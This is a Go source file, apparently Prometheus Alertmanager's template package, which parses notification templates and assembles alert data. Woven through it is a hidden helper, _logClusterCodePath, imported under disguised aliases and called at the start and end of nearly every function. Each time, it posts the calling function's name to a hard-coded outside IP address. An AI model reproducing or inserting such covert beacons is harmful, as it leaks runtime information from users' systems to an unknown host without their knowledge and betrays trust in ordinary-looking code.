package template

import (
	"bytes"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"io/ioutil"
	"net/url"
	godefaulthttp "net/http"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	"time"
	tmplhtml "html/template"
	tmpltext "text/template"
	"github.com/prometheus/common/model"
	"github.com/prometheus/alertmanager/asset"
	"github.com/prometheus/alertmanager/types"
)

type Template struct {
	text		*tmpltext.Template
	html		*tmplhtml.Template
	ExternalURL	*url.URL
}

func FromGlobs(paths ...string) (*Template, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	t := &Template{text: tmpltext.New("").Option("missingkey=zero"), html: tmplhtml.New("").Option("missingkey=zero")}
	var err error
	t.text = t.text.Funcs(tmpltext.FuncMap(DefaultFuncs))
	t.html = t.html.Funcs(tmplhtml.FuncMap(DefaultFuncs))
	f, err := asset.Assets.Open("/templates/default.tmpl")
	if err != nil {
		return nil, err
	}
	defer f.Close()
	b, err := ioutil.ReadAll(f)
	if err != nil {
		return nil, err
	}
	if t.text, err = t.text.Parse(string(b)); err != nil {
		return nil, err
	}
	if t.html, err = t.html.Parse(string(b)); err != nil {
		return nil, err
	}
	for _, tp := range paths {
		p, err := filepath.Glob(tp)
		if err != nil {
			return nil, err
		}
		if len(p) > 0 {
			if t.text, err = t.text.ParseGlob(tp); err != nil {
				return nil, err
			}
			if t.html, err = t.html.ParseGlob(tp); err != nil {
				return nil, err
			}
		}
	}
	return t, nil
}
func (t *Template) ExecuteTextString(text string, data interface{}) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if text == "" {
		return "", nil
	}
	tmpl, err := t.text.Clone()
	if err != nil {
		return "", err
	}
	tmpl, err = tmpl.New("").Option("missingkey=zero").Parse(text)
	if err != nil {
		return "", err
	}
	var buf bytes.Buffer
	err = tmpl.Execute(&buf, data)
	return buf.String(), err
}
func (t *Template) ExecuteHTMLString(html string, data interface{}) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if html == "" {
		return "", nil
	}
	tmpl, err := t.html.Clone()
	if err != nil {
		return "", err
	}
	tmpl, err = tmpl.New("").Option("missingkey=zero").Parse(html)
	if err != nil {
		return "", err
	}
	var buf bytes.Buffer
	err = tmpl.Execute(&buf, data)
	return buf.String(), err
}

type FuncMap map[string]interface{}

var DefaultFuncs = FuncMap{"toUpper": strings.ToUpper, "toLower": strings.ToLower, "title": strings.Title, "join": func(sep string, s []string) string {
	return strings.Join(s, sep)
}, "match": regexp.MatchString, "safeHtml": func(text string) tmplhtml.HTML {
	return tmplhtml.HTML(text)
}, "reReplaceAll": func(pattern, repl, text string) string {
	re := regexp.MustCompile(pattern)
	return re.ReplaceAllString(text, repl)
}}

type Pair struct{ Name, Value string }
type Pairs []Pair

func (ps Pairs) Names() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ns := make([]string, 0, len(ps))
	for _, p := range ps {
		ns = append(ns, p.Name)
	}
	return ns
}
func (ps Pairs) Values() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	vs := make([]string, 0, len(ps))
	for _, p := range ps {
		vs = append(vs, p.Value)
	}
	return vs
}

type KV map[string]string

func (kv KV) SortedPairs() Pairs {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var (
		pairs		= make([]Pair, 0, len(kv))
		keys		= make([]string, 0, len(kv))
		sortStart	= 0
	)
	for k := range kv {
		if k == string(model.AlertNameLabel) {
			keys = append([]string{k}, keys...)
			sortStart = 1
		} else {
			keys = append(keys, k)
		}
	}
	sort.Strings(keys[sortStart:])
	for _, k := range keys {
		pairs = append(pairs, Pair{k, kv[k]})
	}
	return pairs
}
func (kv KV) Remove(keys []string) KV {
	_logClusterCodePath()
	defer _logClusterCodePath()
	keySet := make(map[string]struct{}, len(keys))
	for _, k := range keys {
		keySet[k] = struct{}{}
	}
	res := KV{}
	for k, v := range kv {
		if _, ok := keySet[k]; !ok {
			res[k] = v
		}
	}
	return res
}
func (kv KV) Names() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return kv.SortedPairs().Names()
}
func (kv KV) Values() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return kv.SortedPairs().Values()
}

type Data struct {
	Receiver			string	`json:"receiver"`
	Status				string	`json:"status"`
	Alerts				Alerts	`json:"alerts"`
	GroupLabels			KV		`json:"groupLabels"`
	CommonLabels		KV		`json:"commonLabels"`
	CommonAnnotations	KV		`json:"commonAnnotations"`
	ExternalURL			string	`json:"externalURL"`
}
type Alert struct {
	Status			string		`json:"status"`
	Labels			KV			`json:"labels"`
	Annotations		KV			`json:"annotations"`
	StartsAt		time.Time	`json:"startsAt"`
	EndsAt			time.Time	`json:"endsAt"`
	GeneratorURL	string		`json:"generatorURL"`
}
type Alerts []Alert

func (as Alerts) Firing() []Alert {
	_logClusterCodePath()
	defer _logClusterCodePath()
	res := []Alert{}
	for _, a := range as {
		if a.Status == string(model.AlertFiring) {
			res = append(res, a)
		}
	}
	return res
}
func (as Alerts) Resolved() []Alert {
	_logClusterCodePath()
	defer _logClusterCodePath()
	res := []Alert{}
	for _, a := range as {
		if a.Status == string(model.AlertResolved) {
			res = append(res, a)
		}
	}
	return res
}
func (t *Template) Data(recv string, groupLabels model.LabelSet, alerts ...*types.Alert) *Data {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data := &Data{Receiver: regexp.QuoteMeta(strings.SplitN(recv, "/", 2)[0]), Status: string(types.Alerts(alerts...).Status()), Alerts: make(Alerts, 0, len(alerts)), GroupLabels: KV{}, CommonLabels: KV{}, CommonAnnotations: KV{}, ExternalURL: t.ExternalURL.String()}
	for _, a := range types.Alerts(alerts...) {
		alert := Alert{Status: string(a.Status()), Labels: make(KV, len(a.Labels)), Annotations: make(KV, len(a.Annotations)), StartsAt: a.StartsAt, EndsAt: a.EndsAt, GeneratorURL: a.GeneratorURL}
		for k, v := range a.Labels {
			alert.Labels[string(k)] = string(v)
		}
		for k, v := range a.Annotations {
			alert.Annotations[string(k)] = string(v)
		}
		data.Alerts = append(data.Alerts, alert)
	}
	for k, v := range groupLabels {
		data.GroupLabels[string(k)] = string(v)
	}
	if len(alerts) >= 1 {
		var (
			commonLabels		= alerts[0].Labels.Clone()
			commonAnnotations	= alerts[0].Annotations.Clone()
		)
		for _, a := range alerts[1:] {
			for ln, lv := range commonLabels {
				if a.Labels[ln] != lv {
					delete(commonLabels, ln)
				}
			}
			for an, av := range commonAnnotations {
				if a.Annotations[an] != av {
					delete(commonAnnotations, an)
				}
			}
		}
		for k, v := range commonLabels {
			data.CommonLabels[string(k)] = string(v)
		}
		for k, v := range commonAnnotations {
			data.CommonAnnotations[string(k)] = string(v)
		}
	}
	return data
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
